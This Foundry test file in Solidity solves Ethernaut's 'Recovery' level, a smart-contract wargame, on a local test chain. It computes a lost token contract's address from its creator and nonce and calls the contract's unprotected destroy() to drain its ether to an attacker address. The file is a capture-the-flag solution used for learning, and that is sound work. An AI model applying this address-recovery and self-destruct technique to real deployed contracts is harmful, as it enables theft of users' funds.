// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/17-Recovery/RecoveryFactory.sol";

contract RecoveryTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(hacker, 0.001 ether);
    }

    function testRecoveryHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
        // Recovery ethernautRecovery = Recovery(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // targetAddress = keccak256(RLP(sender, nonce))      
        address targetAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(levelAddress), bytes1(0x01))))));

        SimpleToken simpleToken = SimpleToken(payable(targetAddress));
        simpleToken.destroy(payable(hacker));
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}